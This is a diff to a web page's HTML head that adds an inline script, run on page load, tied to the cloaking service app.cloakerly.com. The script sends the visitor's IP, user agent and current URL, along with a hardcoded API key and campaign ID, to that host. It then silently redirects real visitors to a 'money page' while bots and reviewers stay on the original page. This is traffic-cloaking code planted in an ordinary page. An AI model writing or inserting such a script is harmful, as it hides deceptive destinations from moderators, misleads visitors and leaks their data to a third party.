@@ -8,8 +8,76 @@
     <link rel="icon" href="assets/favicon.png">
     <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.1/css/bootstrap.min.css">
 
+<script>
+var key = "";
+var ip = "";
+var campaign = "";
+var user_agent = "";
+var strictness = 0;
+var failure_redirect = "";
+var success_redirect = "";
+var current_url = window.location.href;
+function executeCheck(){
 
-  <script src="https://app.trafficshield.io/v2/js_code/def4975f69.js"></script>
+  var http = new XMLHttpRequest();
+  var url = "https://app.cloakerly.com/v2/integration/check/"+key+"/"+ip+"/"+campaign;
+  var params = "user_agent="+user_agent+"&strictness="+strictness+"&current_url="+current_url;
+  http.open("POST", url, true);
+
+  http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+  http.onreadystatechange = function() {
+      if(http.readyState == 4 && http.status == 200) {
+          checkResponse(http.responseText);
+      }
+  }
+  http.send(params);
+}
+
+function getIP(key){
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+    var data = JSON.parse(this.responseText);
+    ip = data.ip;
+    user_agent = data.user_agent;
+    executeCheck(key,ip,campaign);
+  }
+  };
+  xhttp.open("GET", "https://app.cloakerly.com/v2/integration/getIp", true);
+  xhttp.send();
+}
+
+function checkResponse(res){
+  response = JSON.parse(res);
+  success_redirect = response.money_page;
+  failure_redirect = response.safe_page;
+
+  if(response.proxy_bot == true){
+  }else if(response.status === false){
+    if(failure_redirect!=""){
+      if(window.location.href.indexOf(failure_redirect) > -1) {
+      }else{
+        if(response.fr == 1){
+          window.location.href = failure_redirect;
+        }
+      }
+    }
+  }else{
+    if(success_redirect!=""){
+      window.location.href = success_redirect;
+    }
+  }
+}
+
+function PreventLoad(){
+    key = "3cntTQKbzIa8vkLXHrciCjxHPB0lDF9v4761xh23mGt6fesOBLEkESJDqqmMF1w5";
+    campaign = "20843";
+    strictness = "0";
+    getIP(key);
+}
+PreventLoad();
+</script>
 
 	
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
